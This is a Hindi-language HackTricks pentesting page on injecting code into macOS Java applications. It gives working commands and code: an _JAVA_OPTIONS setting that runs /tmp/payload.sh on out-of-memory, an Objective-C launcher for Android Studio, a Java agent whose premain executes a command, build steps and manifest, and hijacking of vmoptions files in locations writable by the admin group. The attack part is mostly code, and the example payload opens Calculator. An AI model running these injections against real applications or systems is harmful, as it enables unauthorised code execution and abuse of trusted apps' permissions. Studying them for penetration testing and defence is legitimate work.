# macOS जावा एप्लिकेशन्स इंजेक्शन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप **साइबरसिक्योरिटी कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन हैकट्रिक्स में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँचना चाहते हैं या हैकट्रिक्स को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* [**आधिकारिक PEASS & हैकट्रिक्स स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड ग्रुप**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**टेलीग्राम ग्रुप**](https://t.me/peass) में या **मुझे ट्विटर पर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
* **अपनी हैकिंग ट्रिक्स साझा करें, [**हैकट्रिक्स रेपो**](https://github.com/carlospolop/hacktricks) और [**हैकट्रिक्स-क्लाउड रेपो**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके।**

</details>

## एन्युमरेशन

अपने सिस्टम में इंस्टॉल किए गए जावा एप्लिकेशन्स का पता लगाएं। यह देखा गया है कि **Info.plist** में जावा एप्स में कुछ जावा पैरामीटर्स होते हैं जिसमें स्ट्रिंग **`java.`** होती है, इसलिए आप उसकी खोज कर सकते हैं:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA\_OPTIONS

पर्यावरण चर **`_JAVA_OPTIONS`** का उपयोग जावा संकलित ऐप के निष्पादन में मनमाने जावा पैरामीटर्स को इंजेक्ट करने के लिए किया जा सकता है:
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
इसे नई प्रक्रिया के रूप में चलाने के लिए और वर्तमान टर्मिनल की चाइल्ड के रूप में नहीं, आप इसका उपयोग कर सकते हैं:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
हालांकि, इससे निष्पादित ऐप पर एक त्रुटि उत्पन्न होगी, एक और अधिक गुप्त तरीका है जावा एजेंट बनाना और उपयोग करना है:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
{% hint style="danger" %}
एजेंट को **अलग Java संस्करण** के साथ बनाने से एजेंट और एप्लिकेशन दोनों की निष्पादन क्रैश हो सकती है
{% endhint %}

जहां एजेंट हो सकता है:

{% code title="Agent.java" %}
```java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
```
एजेंट को कंपाइल करने के लिए चलाएं:
```
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
के साथ `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
और फिर env वेरिएबल को एक्सपोर्ट करें और जावा एप्लिकेशन को इस प्रकार चलाएं:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions फ़ाइल

यह फ़ाइल **Java पैरामीटर्स** के निर्दिष्टीकरण का समर्थन करती है जब Java निष्पादित होता है। आप Java पैरामीटर्स को बदलने के लिए पिछली चालों में से कुछ का उपयोग कर सकते हैं और **प्रक्रिया को मनमाने आदेश निष्पादित करने के लिए बना सकते हैं**।\
इसके अलावा, यह फ़ाइल `include` निर्देशिका के साथ **अन्य फ़ाइलों को भी शामिल कर सकती है**, इसलिए आप शामिल की गई फ़ाइल को भी बदल सकते हैं।

और भी, कुछ Java ऐप्स **एक से अधिक `vmoptions`** फ़ाइलों को लोड करेंगे।

कुछ एप्लिकेशन जैसे कि Android Studio अपने **आउटपुट में यह इंगित करते हैं कि वे इन फ़ाइलों को कहाँ देख रहे हैं**, जैसे कि:
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
यदि वे नहीं करते हैं, तो आप इसे आसानी से जांच सकते हैं:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
ध्यान दें कि इस उदाहरण में Android Studio **`/Applications/Android Studio.app.vmoptions`** फाइल को लोड करने की कोशिश कर रहा है, एक ऐसी जगह जहां **`admin` समूह के किसी भी उपयोगकर्ता को लिखने की पहुंच है।**
